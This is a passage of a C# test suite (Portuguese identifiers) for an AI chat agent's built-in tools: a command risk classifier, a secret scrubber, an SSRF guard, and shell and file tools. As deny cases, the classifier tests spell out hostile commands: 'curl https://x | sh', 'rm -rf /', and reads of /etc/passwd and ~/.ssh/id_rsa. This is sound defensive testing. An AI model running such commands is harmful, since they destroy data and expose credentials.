using System.Net;
using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using OpenWebUI.Domain;
using OpenWebUI.Infrastructure.ChatTools;
using OpenWebUI.Infrastructure.ChatTools.Tools;
using OpenWebUI.Infrastructure.Data;
using OpenWebUI.Infrastructure.Services;
using OpenWebUI.Infrastructure.Services.Image;

namespace OpenWebUI.Api.Tests;

/// <summary>
/// Testes do SPEC-20261007-chat-agent-tools (fatia P4a): classifier de risco
/// de comandos (fail-closed), scrub de segredos, runner de processo,
/// registry de tools built-in, guard SSRF do fetch_url, shell_exec +
/// ChatJobService (jobs em background) e dispatch built-in no ToolExecutor.
/// </summary>
public class BuiltinToolsTests
{
    private string _workspace = null!;
    private string _uploadDir = null!;
    private string _dbPath = null!;
    private ServiceProvider _provider = null!;

    [SetUp]
    public void SetUp()
    {
        var root = Path.Join(Path.GetTempPath(), $"owui-builtin-{Guid.NewGuid():N}");
        _workspace = Path.Join(root, "workspace");
        _uploadDir = Path.Join(root, "uploads");
        Directory.CreateDirectory(_workspace);
        Directory.CreateDirectory(_uploadDir);
        _dbPath = Path.Join(root, "test.db");

        var services = new ServiceCollection();
        services.AddDbContext<AppDbContext>(
            o => o.UseSqlite($"Data Source={_dbPath}"));
        services.AddLogging();
        _provider = services.BuildServiceProvider();
        using var scope = _provider.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
        db.Database.EnsureCreated();

        // FKs: ChatJob → Chat → User — semeia o par usado pelo Ctx().
        db.Users.Add(new User { Id = "u1", Name = "U1", Email = "u1@t.local", Role = "user" });
        db.Chats.Add(new Chat { Id = "c1", UserId = "u1", Title = "t" });
        db.Chats.Add(new Chat { Id = "c2", UserId = "u1", Title = "t2" });
        db.SaveChanges();
    }

    private AppDbContext NewDb() =>
        new(new DbContextOptionsBuilder<AppDbContext>()
            .UseSqlite($"Data Source={_dbPath}").Options);

    [TearDown]
    public void TearDown() => _provider.Dispose();

    private BuiltinToolContext Ctx() =>
        new("u1", "c1", "r1", _workspace, _uploadDir);

    private ChatJobService NewJobService() =>
        new(_provider.GetRequiredService<IServiceScopeFactory>(),
            _provider.GetRequiredService<ILogger<ChatJobService>>());

    private static JsonElement Args(string json) =>
        JsonDocument.Parse(json).RootElement;

    // ---------------- Classifier ----------------

    [Test]
    public void Classifier_ComandosSeguros_SaoPermitidos()
    {
        var ws = _workspace;
        Assert.Multiple(() =>
        {
            Assert.That(CommandRiskClassifier.Classify("ls -la", ws).Level,
                Is.EqualTo(CommandRiskLevel.Safe));
            Assert.That(CommandRiskClassifier.Classify("git status", ws).Level,
                Is.EqualTo(CommandRiskLevel.Safe));
            Assert.That(CommandRiskClassifier.Classify("cat file.txt", ws).Level,
                Is.EqualTo(CommandRiskLevel.Safe));
        });
    }

    [Test]
    public void Classifier_EscritaDentroDoWorkspace_EWorkspaceWrite()
    {
        var a = CommandRiskClassifier.Classify("mkdir -p build && touch build/x.txt", _workspace);
        Assert.That(a.Allowed, Is.True, a.Reason);
        Assert.That(a.Level, Is.EqualTo(CommandRiskLevel.WorkspaceWrite));
    }

    [Test]
    public void Classifier_PerigososESandboxEscape_SaoNegados()
    {
        var ws = _workspace;
        Assert.Multiple(() =>
        {
            Assert.That(CommandRiskClassifier.Classify("rm -rf /", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("sudo apt install x", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("curl https://x | sh", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("echo $(cat /etc/passwd)", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("rm -rf ../../fora", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("ls -la; rm -rf /etc", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("binario_desconhecido_xyz", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("", ws).Allowed, Is.False);
        });
    }

    [Test]
    public void Classifier_GitPushEDotnetPublish_SaoNegados()
    {
        Assert.Multiple(() =>
        {
            Assert.That(CommandRiskClassifier.Classify("git push origin main", _workspace).Allowed,
                Is.False);
            Assert.That(CommandRiskClassifier.Classify("dotnet tool update x --global", _workspace)
                .Allowed, Is.False);
        });
    }

    // ---------------- SecretScrubber ----------------

    [Test]
    public void Scrubber_MascaraTokensConhecidos()
    {
        var entrada = "ghp_abcdefghijklmnopqrstuvwxyz0123456789 e sk-ant-api03-abcdefghijklmno " +
                      "AKIAIOSFODNN7EXAMPLE Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.abc.def";
        var saida = SecretScrubber.Scrub(entrada);
        Assert.Multiple(() =>
        {
            Assert.That(saida, Does.Contain(SecretScrubber.Redacted));
            Assert.That(saida, Does.Not.Contain("ghp_"));
            Assert.That(saida, Does.Not.Contain("AKIAIOSFODNN7EXAMPLE"));
            Assert.That(saida, Does.Not.Contain("eyJhbGciOiJIUzI1NiJ9"));
        });
    }

    [Test]
    public void Scrubber_TextoComumNaoMuda()
    {
        Assert.That(SecretScrubber.Scrub("hello world 123"), Is.EqualTo("hello world 123"));
        Assert.That(SecretScrubber.Scrub(null), Is.Null);
    }

    // ---------------- ChatProcessRunner ----------------

    [Test]
    public async Task Runner_CapturaSaidaEExitCode()
    {
        var ok = await ChatProcessRunner.RunAsync(
            "echo hello && echo err >&2 && exit 3", _workspace, TimeSpan.FromSeconds(10), ct: default);
        Assert.Multiple(() =>
        {
            Assert.That(ok.ExitCode, Is.EqualTo(3));
            Assert.That(ok.Output, Does.Contain("hello").And.Contain("err"));
            Assert.That(ok.TimedOut, Is.False);
        });
    }

    [Test]
    public async Task Runner_TimeoutMataETruncamentoFunciona()
    {
        var lento = await ChatProcessRunner.RunAsync(
            "sleep 30", _workspace, TimeSpan.FromMilliseconds(500), ct: default);
        Assert.That(lento.TimedOut, Is.True);

        var grande = await ChatProcessRunner.RunAsync(
            "seq 1 100000", _workspace, TimeSpan.FromSeconds(15), maxOutputChars: 1000);
        Assert.Multiple(() =>
        {
            Assert.That(grande.Truncated, Is.True);
            Assert.That(grande.Output.Length, Is.LessThanOrEqualTo(1000));
        });
    }

    [Test]
    public async Task Runner_SaidaComSegredoEhMascarada()
    {
        var o = await ChatProcessRunner.RunAsync(
            "echo ghp_abcdefghijklmnopqrstuvwxyz0123456789", _workspace,
            TimeSpan.FromSeconds(10), ct: default);
        Assert.Multiple(() =>
        {
            Assert.That(o.Output, Does.Contain(SecretScrubber.Redacted));
            Assert.That(o.Output, Does.Not.Contain("ghp_abcdefghijklmnopqrstuvwxyz"));
        });
    }

    // ---------------- BuiltinToolRegistry ----------------

    [Test]
    public async Task Registry_ResolveIdsEExecuta()
    {
        var registry = new BuiltinToolRegistry(
            [new FetchUrlBuiltinTool(new StubHttpClientFactory())],
            new ConfigurationBuilder().Build());

        var dbIds = new List<string>();
        var resolved = registry.ResolveIds(["db-tool-1", "builtin:fetch_url"], dbIds);
        Assert.Multiple(() =>
        {
            Assert.That(resolved, Has.Count.EqualTo(1));
            Assert.That(resolved[0].Id, Is.EqualTo("builtin:fetch_url"));
            Assert.That(resolved[0].Url, Is.EqualTo("builtin://fetch_url"));
            Assert.That(resolved[0].SpecJson, Does.Contain("fetch_url"));
            Assert.That(dbIds, Is.EqualTo(new List<string> { "db-tool-1" }));
        });

        var outcome = await registry.ExecuteAsync(
            resolved[0], "{\"url\":\"http://127.0.0.1:1/x\"}", Ctx(), default);
        Assert.That(outcome, Is.Not.Null);
        Assert.That(outcome!.Text, Does.Contain("privad").Or.Contain("negad"));
    }

    [Test]
    public async Task Registry_DesabilitadoViaConfigEIdDesconhecido()
    {
        var config = new ConfigurationBuilder()
            .AddInMemoryCollection(new Dictionary<string, string?>
            {
                ["BuiltinTools:Disabled"] = "fetch_url,shell_exec",
            })
            .Build();
        var registry = new BuiltinToolRegistry(
            [new FetchUrlBuiltinTool(new StubHttpClientFactory())], config);

        Assert.That(registry.All, Is.Empty);
        Assert.That(registry.ResolveIds(["builtin:fetch_url"], []), Is.Empty);

        var outcome = await registry.ExecuteAsync(
            new Tool { Url = "builtin://nao_existe" }, "{}", Ctx(), default);
        Assert.That(outcome, Is.Not.Null);
        Assert.That(outcome!.Text, Does.Contain("não existe"));
    }

    // ---------------- FetchUrl (SSRF) ----------------

    [Test]
    public async Task FetchUrl_BloqueiaHostsPrivados()
    {
        var tool = new FetchUrlBuiltinTool(new StubHttpClientFactory());
        string[] urls =
        [
            "http://127.0.0.1:8080/admin",
            "http://localhost/x",
            "http://192.168.1.1/",
            "http://169.254.169.254/latest/meta-data",
            "http://10.0.0.5/",
            "http://[::1]/",
            "ftp://exemplo.com/arq",
            "nao-e-url",
        ];
        foreach (var url in urls)
        {
            var r = await tool.ExecuteAsync(Args($"{{\"url\":\"{url}\"}}"), Ctx(), default);
            Assert.That(r.Text, Does.Not.StartWith("200"), url);
            Assert.That(r.Text, Does.Contain("privad")
                .Or.Contain("http").Or.Contain("URL"), url);
        }
    }

    // ---------------- ShellExec + Jobs ----------------

    [Test]
    public async Task ShellExec_ComandoPerigosoEhRecusadoSemExecutar()
    {
        var tool = new ShellExecBuiltinTool(NewJobService());
        var r = await tool.ExecuteAsync(
            Args("{\"command\":\"rm -rf /\"}"), Ctx(), default);
        Assert.Multiple(() =>
        {
            Assert.That(r.Refused, Is.True);
            Assert.That(r.RefuseReason, Is.Not.Null.And.Not.Empty);
            Assert.That(r.Text, Does.Contain("negado"));
        });
    }

    [Test]
    public async Task ShellExec_ForegroundExecutaERetornaStatus()
    {
        var tool = new ShellExecBuiltinTool(NewJobService());
        var r = await tool.ExecuteAsync(
            Args("{\"command\":\"echo oi-do-shell\"}"), Ctx(), default);
        Assert.Multiple(() =>
        {
            Assert.That(r.Refused, Is.False);
            Assert.That(r.Text, Does.Contain("oi-do-shell").And.Contain("exit 0"));
        });
    }

    [Test]
    public async Task ShellExec_BackgroundCriaJobEJobToolsGerenciam()
    {
        var jobs = NewJobService();
        var shell = new ShellExecBuiltinTool(jobs);
        var r = await shell.ExecuteAsync(
            Args("{\"command\":\"echo saida-job > j.log && tail -f j.log\",\"background\":true}"),
            Ctx(), default);
        Assert.That(r.Refused, Is.False);

        var jobId = JsonDocument.Parse(JsonSerializer.Serialize(r.Result!))
            .RootElement.GetProperty("jobId").GetString()!;

        // job_list vê o job do chat.
        var list = await new JobListBuiltinTool(jobs).ExecuteAsync(Args("{}"), Ctx(), default);
        Assert.That(list.Text, Does.Contain(jobId));

        // job_output traz a saída mascarada assim que gravada.
        var output = await new JobOutputBuiltinTool(jobs).ExecuteAsync(
            Args($"{{\"job_id\":\"{jobId}\"}}"), Ctx(), default);
        Assert.That(output.Text, Does.Not.Contain("não encontrad"));

        // job_kill mata e o status reflete.
        var kill = await new JobKillBuiltinTool(jobs).ExecuteAsync(
            Args($"{{\"job_id\":\"{jobId}\"}}"), Ctx(), default);
        Assert.That(kill.Text, Does.Not.Contain("falhou"));

        var job = await jobs.GetAsync("u1", jobId, default);
        Assert.That(job!.Status, Is.EqualTo(ChatJobStatus.Killed));
    }

    [Test]
    public async Task JobService_ComandoCompletaComOutputPersistido()
    {
        var jobs = NewJobService();
        var job = await jobs.StartAsync("echo texto-persistido", Ctx(), default);

        ChatJob? final = null;
        for (var i = 0; i < 100 && final?.Status == ChatJobStatus.Running || final is null; i++)
        {
            await Task.Delay(100);
            final = await jobs.GetAsync("u1", job.Id, default);
            if (final!.Status != ChatJobStatus.Running) break;
        }

        var output = await jobs.GetOutputAsync("u1", job.Id, 8000, default);
        Assert.Multiple(() =>
        {
            Assert.That(final!.Status, Is.EqualTo(ChatJobStatus.Completed));
            Assert.That(output!.Value.Output, Does.Contain("texto-persistido"));
        });
    }

    [Test]
    public async Task JobService_ComandoNegadoLancaEIsolamentoPorUsuario()
    {
        var jobs = NewJobService();
        await Assert.ThatAsync(
            async () => await jobs.StartAsync("rm -rf /", Ctx(), default),
            Throws.InvalidOperationException);

        var job = await jobs.StartAsync("echo x", Ctx(), default);
        Assert.That(await jobs.GetAsync("outro-usuario", job.Id, default), Is.Null);
        Assert.That(await jobs.KillAsync("outro-usuario", job.Id, default), Is.False);
        await jobs.KillAsync("u1", job.Id, default);
    }

    [Test]
    public async Task JobService_SweepMarcaOrfaosComoKilled()
    {
        await using var scope = _provider.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
        db.ChatJobs.Add(new ChatJob
        {
            Id = "job-orfao-1",
            ChatId = "c1",
            UserId = "u1",
            Command = "sleep 9999",
            WorkspacePath = _workspace,
            Status = ChatJobStatus.Running,
            Pid = 999_999_999,
            StartedAt = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
        });
        await db.SaveChangesAsync();

        var jobs = NewJobService();
        await jobs.SweepOrphansAsync(default);

        var swept = await jobs.GetAsync("u1", "job-orfao-1", default);
        Assert.That(swept!.Status, Is.EqualTo(ChatJobStatus.Killed));
    }

    // ---------------- ToolExecutor dispatch ----------------

    [Test]
    public async Task Executor_DespachaBuiltinERespeitaContextoNulo()
    {
        await using var scope = _provider.CreateAsyncScope();
        var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();
        var registry = new BuiltinToolRegistry(
            [new FetchUrlBuiltinTool(new StubHttpClientFactory())],
            new ConfigurationBuilder().Build());
        var executor = new ToolExecutor(db, new StubHttpClientFactory(),
            new PythonToolExecutor(new ConfigurationBuilder().Build()),
            new McpClientService(db, new Microsoft.Extensions.Caching.Memory.MemoryCache(
                new Microsoft.Extensions.Caching.Memory.MemoryCacheOptions())),
            registry);

        var tools = await executor.LoadEnabledAsync("u1", ["builtin:fetch_url"]);
        Assert.That(tools, Has.Count.EqualTo(1));

        // Sem contexto built-in → erro amigável para o modelo.
        var semCtx = await executor.ExecuteAsync(tools, "builtin:fetch_url",
            "{\"url\":\"http://exemplo.com\"}", ct: default);
        Assert.That(semCtx.Text, Does.Contain("built-in").Or.Contain("builtin"));

        // Com contexto → SSRF guard bloqueia host privado.
        var comCtx = await executor.ExecuteAsync(tools, "builtin:fetch_url",
            "{\"url\":\"http://127.0.0.1:1/\"}", Ctx(), default);
        Assert.That(comCtx.Text, Does.Contain("ssrf").Or.Contain("privad").Or.Contain("negad"));
    }

    [Test]
    public async Task Executor_NomeSemOuComPrefixo_ResolveBuiltin()
    {
        // Providers sanitizam o nome da função (':' é inválido no spec OpenAI):
        // o modelo pode emitir "fetch_url" ou "builtin_fetch_url" — ambos
        // precisam resolver a built-in em vez de "não está habilitada".
        using var db = NewDb();
        var registry = new BuiltinToolRegistry(
            [new FetchUrlBuiltinTool(new StubHttpClientFactory())],
            new ConfigurationBuilder().Build());
        var executor = new ToolExecutor(db, new StubHttpClientFactory(),
            new PythonToolExecutor(new ConfigurationBuilder().Build()),
            new McpClientService(db, new Microsoft.Extensions.Caching.Memory.MemoryCache(
                new Microsoft.Extensions.Caching.Memory.MemoryCacheOptions())),
            registry);

        var tools = await executor.LoadEnabledAsync("u1", ["builtin:fetch_url"]);
        Assert.That(ToolExecutor.FunctionName(tools[0]), Is.EqualTo("builtin_fetch_url"));

        foreach (var name in new[] { "builtin_fetch_url", "builtin:fetch_url", "fetch_url" })
        {
            var outcome = await executor.ExecuteAsync(tools, name,
                "{\"url\":\"http://127.0.0.1:1/\"}", Ctx(), default);
            Assert.That(outcome.Text, Does.Not.Contain("não está habilitada"), name);
        }
    }

    [Test]
    public async Task CodeInterpreter_PythonExecutaEMarcaMutavel()
    {
        var tool = new CodeInterpreterBuiltinTool();
        Assert.That(tool.RequiresApproval, Is.True);

        var r = await tool.ExecuteAsync(
            Args("{\"language\":\"python3\",\"code\":\"print(40+2)\"}"), Ctx(), default);
        Assert.Multiple(() =>
        {
            Assert.That(r.Refused, Is.False);
            Assert.That(r.Text, Does.Contain("42"));
        });
    }

    [Test]
    public async Task CodeInterpreter_LinguagemInvalidaEhErro()
    {
        var tool = new CodeInterpreterBuiltinTool();
        var r = await tool.ExecuteAsync(
            Args("{\"language\":\"powershell\",\"code\":\"x\"}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("language").Or.Contain("inválid").Or.Contain("suportad"));
    }

    [Test]
    public async Task JobList_FiltrosEJobKill_JobFinalizado()
    {
        var jobs = NewJobService();
        var j1 = await jobs.StartAsync("echo em-c1", Ctx(), default);
        var j2 = await jobs.StartAsync(
            "touch j2.log && tail -f j2.log", Ctx() with { ChatId = "c2" }, default);
        await jobs.KillAsync("u1", j1.Id, default);

        // Sem all_chats → só jobs do chat do contexto.
        var soChat = await new JobListBuiltinTool(jobs)
            .ExecuteAsync(Args("{\"include_finished\":true}"), Ctx(), default);
        Assert.Multiple(() =>
        {
            Assert.That(soChat.Text, Does.Contain(j1.Id));
            Assert.That(soChat.Text, Does.Not.Contain(j2.Id));
        });

        // include_finished=false esconde o job morto; all_chats traz os dois.
        var running = await new JobListBuiltinTool(jobs)
            .ExecuteAsync(Args("{\"all_chats\":true,\"include_finished\":false}"), Ctx(), default);
        Assert.Multiple(() =>
        {
            Assert.That(running.Text, Does.Not.Contain(j1.Id));
            Assert.That(running.Text, Does.Contain(j2.Id));
        });

        // job_id errado e kill em job finalizado → mensagem amigável.
        var miss = await new JobOutputBuiltinTool(jobs)
            .ExecuteAsync(Args("{\"job_id\":\"nao-existe\"}"), Ctx(), default);
        Assert.That(miss.Text, Does.Contain("não encontrado"));

        var killAgain = await new JobKillBuiltinTool(jobs)
            .ExecuteAsync(Args($"{{\"job_id\":\"{j1.Id}\"}}"), Ctx(), default);
        Assert.That(killAgain.Text, Does.Contain("falh").Or.Contain("não"));

        await jobs.KillAsync("u1", j2.Id, default);
    }

    [Test]
    public async Task ShellExec_TimeoutForegroundReporta()
    {
        await File.WriteAllTextAsync(Path.Join(_workspace, "j.log"), "linha\n");
        var tool = new ShellExecBuiltinTool(NewJobService());
        var r = await tool.ExecuteAsync(
            Args("{\"command\":\"tail -f j.log\",\"timeout_seconds\":1}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("timeout"));
    }

    // ---------------- GenerateImage / WebSearch ----------------

    private GenerateImageBuiltinTool NewImageTool()
    {
        var cache = new Microsoft.Extensions.Caching.Memory.MemoryCache(
            new Microsoft.Extensions.Caching.Memory.MemoryCacheOptions());
        var svc = new ImageGenerationService(
            new ImageEngineFactory(new StubHttpClientFactory()),
            new ConfigService(NewDb(), cache), NewDb());
        return new GenerateImageBuiltinTool(svc);
    }

    [Test]
    public async Task GenerateImage_ArgsObrigatoriosESemProvider()
    {
        var tool = NewImageTool();
        var semPrompt = await tool.ExecuteAsync(Args("{}"), Ctx(), default);
        Assert.That(semPrompt.Text, Does.Contain("prompt").And.Contain("obrigatório"));

        // Provider de imagens não configurado → erro amigável, nunca exceção.
        var r = await tool.ExecuteAsync(
            Args("{\"prompt\":\"um gato\",\"n\":1,\"size\":\"512x512\"}"), Ctx(), default);
        Assert.That(r.Text, Does.Not.EqualTo(string.Empty));
        Assert.That(r.Text, Does.Contain("falh").Or.Contain("não retornou"));
    }

    [Test]
    public async Task WebSearch_ArgsObrigatoriosESemEngine()
    {
        var cache = new Microsoft.Extensions.Caching.Memory.MemoryCache(
            new Microsoft.Extensions.Caching.Memory.MemoryCacheOptions());
        var db = NewDb();
        // engine=none explícito: o default passou a ser duckduckgo.
        db.ConfigEntries.Add(new ConfigEntry
        {
            Key = "retrieval.config",
            ValueJson = JsonSerializer.Serialize(new { engine = "none" }),
            UpdatedAt = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
        });
        await db.SaveChangesAsync();
        var tool = new WebSearchBuiltinTool(
            new WebSearchService(new StubHttpClientFactory(),
                new ConfigService(db, cache)));

        var semQuery = await tool.ExecuteAsync(Args("{}"), Ctx(), default);
        Assert.That(semQuery.Text, Does.Contain("query").And.Contain("obrigatório"));

        var semEngine = await tool.ExecuteAsync(
            Args("{\"query\":\"devin ai\",\"count\":3}"), Ctx(), default);
        Assert.That(semEngine.Text, Does.Contain("não configurada"));
    }

    // ---------------- CodeInterpreter / misc ----------------

    [Test]
    public async Task CodeInterpreter_NodeExecuta()
    {
        var tool = new CodeInterpreterBuiltinTool();
        var r = await tool.ExecuteAsync(
            Args("{\"language\":\"node\",\"code\":\"console.log(6*7)\"}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("42"));
    }

    [Test]
    public async Task Registry_ArgsJsonQuebrados_RetornaErro()
    {
        var registry = new BuiltinToolRegistry(
            [new FetchUrlBuiltinTool(new StubHttpClientFactory())],
            new ConfigurationBuilder().Build());
        var tool = registry.ToSyntheticTool(
            new FetchUrlBuiltinTool(new StubHttpClientFactory()));
        var outcome = await registry.ExecuteAsync(tool, "{quebrado", Ctx(), default);
        Assert.That(outcome, Is.Not.Null);
        Assert.That(outcome!.Text, Does.Not.EqualTo(string.Empty));
    }

    [Test]
    public async Task FetchUrl_UrlObrigatoria()
    {
        var tool = new FetchUrlBuiltinTool(new StubHttpClientFactory());
        var r = await tool.ExecuteAsync(Args("{}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("URL"));
    }

    [Test]
    public void Classifier_SubComandosGit()
    {
        var ws = _workspace;
        Assert.Multiple(() =>
        {
            // Read-only → Safe; mutações locais → WorkspaceWrite; remoto/destrutivo → Dangerous.
            Assert.That(CommandRiskClassifier.Classify("git log --oneline -5", ws).Level,
                Is.EqualTo(CommandRiskLevel.Safe));
            Assert.That(CommandRiskClassifier.Classify("git add .", ws).Level,
                Is.EqualTo(CommandRiskLevel.WorkspaceWrite));
            Assert.That(CommandRiskClassifier.Classify("git commit -m ok", ws).Allowed, Is.True);
            Assert.That(CommandRiskClassifier.Classify("git remote add o x", ws).Level,
                Is.EqualTo(CommandRiskLevel.WorkspaceWrite));
            Assert.That(CommandRiskClassifier.Classify("git pull", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("git reset --hard HEAD~1", ws).Allowed,
                Is.False);
            Assert.That(CommandRiskClassifier.Classify("git clean -fd", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("git branch -D feat", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("git stash drop", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("git config --global x y", ws).Allowed,
                Is.False);
            Assert.That(CommandRiskClassifier.Classify("git inventado", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("git", ws).Level,
                Is.EqualTo(CommandRiskLevel.Safe));
        });
    }

    [Test]
    public void Classifier_SubComandosDotnetNpmERm()
    {
        var ws = _workspace;
        Assert.Multiple(() =>
        {
            Assert.That(CommandRiskClassifier.Classify("dotnet test", ws).Level,
                Is.EqualTo(CommandRiskLevel.Safe));
            Assert.That(CommandRiskClassifier.Classify("dotnet build", ws).Level,
                Is.EqualTo(CommandRiskLevel.WorkspaceWrite));
            Assert.That(CommandRiskClassifier.Classify("dotnet nuget push x", ws).Allowed,
                Is.False);
            Assert.That(CommandRiskClassifier.Classify("dotnet inventado", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("npm install", ws).Level,
                Is.EqualTo(CommandRiskLevel.WorkspaceWrite));
            Assert.That(CommandRiskClassifier.Classify("npm test", ws).Level,
                Is.EqualTo(CommandRiskLevel.WorkspaceWrite));
            Assert.That(CommandRiskClassifier.Classify("npm publish", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("npm login", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("rm arquivo.txt", ws).Level,
                Is.EqualTo(CommandRiskLevel.WorkspaceWrite));
            Assert.That(CommandRiskClassifier.Classify("rm", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("rm ../fora.txt", ws).Allowed, Is.False);
        });
    }

    [Test]
    public void Classifier_PathsERedirectsForaDoWorkspace()
    {
        var ws = _workspace;
        Assert.Multiple(() =>
        {
            Assert.That(CommandRiskClassifier.Classify("cat /etc/passwd", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("cat ../segredo.txt", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("ls ~", ws).Allowed, Is.False);
            Assert.That(CommandRiskClassifier.Classify("echo hi > /tmp/fora.txt", ws).Allowed,
                Is.False);
            Assert.That(CommandRiskClassifier.Classify("echo hi > dentro.txt", ws).Level,
                Is.EqualTo(CommandRiskLevel.WorkspaceWrite));
            Assert.That(CommandRiskClassifier.Classify("cat $HOME/.ssh/id_rsa", ws).Allowed,
                Is.False);
        });
    }

    // ---------------- FetchUrl — caminho de sucesso ----------------

    [Test]
    public async Task FetchUrl_HtmlPublico_ConverteTexto()
    {
        var html = "<html><head><title>t</title><style>body{color:red}</style>"
            + "<script>alert(1)</script></head><body><h1>Titulo Grande</h1>"
            + "<p>paragrafo um</p><p>paragrafo dois</p></body></html>";
        var tool = new FetchUrlBuiltinTool(
            new StubHttpClientFactory(new FakeHandler(HttpStatusCode.OK, html, "text/html")));

        // IP público literal — não precisa de DNS e não é privado.
        var r = await tool.ExecuteAsync(
            Args("{\"url\":\"http://93.184.216.34/pagina\"}"), Ctx(), default);
        Assert.Multiple(() =>
        {
            Assert.That(r.Text, Does.Contain("HTTP 200"));
            Assert.That(r.Text, Does.Contain("Titulo Grande"));
            Assert.That(r.Text, Does.Contain("paragrafo um"));
            Assert.That(r.Text, Does.Not.Contain("alert(1)"));
            Assert.That(r.Text, Does.Not.Contain("color:red"));
        });
    }

    [Test]
    public async Task FetchUrl_TextoSimplesETruncamento()
    {
        var body = new string('x', 20_000);
        var tool = new FetchUrlBuiltinTool(
            new StubHttpClientFactory(new FakeHandler(HttpStatusCode.OK, body, "text/plain")));
        var r = await tool.ExecuteAsync(
            Args("{\"url\":\"http://93.184.216.34/big.txt\",\"max_chars\":600}"), Ctx(), default);
        Assert.Multiple(() =>
        {
            Assert.That(r.Text, Does.Contain("HTTP 200"));
            Assert.That(r.Text, Does.Contain("truncado"));
            Assert.That(r.Text.Length, Is.LessThan(800));
        });
    }

    [Test]
    public async Task FetchUrl_FalhaHttp_RetornaErroAmigavel()
    {
        var tool = new FetchUrlBuiltinTool(
            new StubHttpClientFactory(new ThrowingHandler()));
        var r = await tool.ExecuteAsync(
            Args("{\"url\":\"http://93.184.216.34/\"}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("Falha ao baixar"));
    }

    // ---------------- WebSearch — resultados ----------------

    [Test]
    public async Task WebSearch_EngineDuckDuckGo_FormataResultados()
    {
        await using var db = NewDb();
        db.ConfigEntries.Add(new ConfigEntry
        {
            Key = "retrieval.config",
            ValueJson = JsonSerializer.Serialize(new { engine = "duckduckgo" }),
            UpdatedAt = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
        });
        await db.SaveChangesAsync();

        var ddgJson = "{\"RelatedTopics\":[{\"Text\":\"Resultado um\",\"FirstURL\":\"https://ex.com\"}]}";
        var tool = new WebSearchBuiltinTool(new WebSearchService(
            new StubHttpClientFactory(new FakeHandler(HttpStatusCode.OK, ddgJson, "application/json")),
            new ConfigService(NewDb(), new Microsoft.Extensions.Caching.Memory.MemoryCache(
                new Microsoft.Extensions.Caching.Memory.MemoryCacheOptions()))));

        var r = await tool.ExecuteAsync(
            Args("{\"query\":\"devin\",\"count\":3}"), Ctx(), default);
        Assert.That(r.Text, Does.Contain("Resultado um").Or.Contain("ex.com"));
    }

    // ---------------- File tools (P11) ----------------

    [Test]
    public async Task FileWrite_CriaArquivo_ERetornaDiff()
    {
        var tool = new FileWriteBuiltinTool();
        var r = await tool.ExecuteAsync(
            Args("{\"path\":\"src/a.txt\",\"content\":\"linha1\\nlinha2\\n\"}"), Ctx(), default);

        Assert.Multiple(() =>
        {
            Assert.That(File.ReadAllText(Path.Join(_workspace, "src", "a.txt")),
                Is.EqualTo("linha1\nlinha2\n"));
            Assert.That(r.Text, Does.Contain("a.txt").And.Contain("+linha1"));
            Assert.That(tool.RequiresApproval, Is.True);
        });
    }

    [Test]
    public async Task FileWrite_ForaDoWorkspace_ENegado()
    {
        var tool = new FileWriteBuiltinTool();
        Assert.Multiple(async () =>
        {
            Assert.That((await tool.ExecuteAsync(
                Args("{\"path\":\"../fora.txt\",\"content\":\"x\"}"), Ctx(), default)).Text,
                Does.Contain("escapa do workspace"));
            Assert.That((await tool.ExecuteAsync(
                Args("{\"path\":\"/tmp/abs.txt\",\"content\":\"x\"}"), Ctx(), default)).Text,
                Does.Contain("absoluto"));
            Assert.That((await tool.ExecuteAsync(
                Args("{\"path\":\"~/home.txt\",\"content\":\"x\"}"), Ctx(), default)).Text,
                Does.Contain("não resolve"));
        });
        Assert.That(File.Exists(Path.Join(_workspace, "..", "fora.txt")), Is.False);
    }

    [Test]
    public async Task FileRead_LeComNumeracao_EPagina()
    {
        var path = Path.Join(_workspace, "num.txt");
        File.WriteAllLines(path, Enumerable.Range(1, 20).Select(i => $"l{i}"));

        var tool = new FileReadBuiltinTool();
        var r = await tool.ExecuteAsync(
            Args("{\"path\":\"num.txt\",\"offset\":10,\"limit\":5}"), Ctx(), default);

        Assert.Multiple(() =>
        {
            Assert.That(r.Text, Does.Contain("10: l10").And.Contain("14: l14"));
            Assert.That(r.Text, Does.Not.Contain("15: l15"));
            Assert.That(r.Text, Does.Contain("truncado"));
        });
    }

    [Test]
    public async Task FileEdit_SubstituiUmaOcorrencia_ERetornaDiff()
    {
        File.WriteAllText(Path.Join(_workspace, "e.txt"), "aaa bbb ccc\n");
        var tool = new FileEditBuiltinTool();

        var r = await tool.ExecuteAsync(
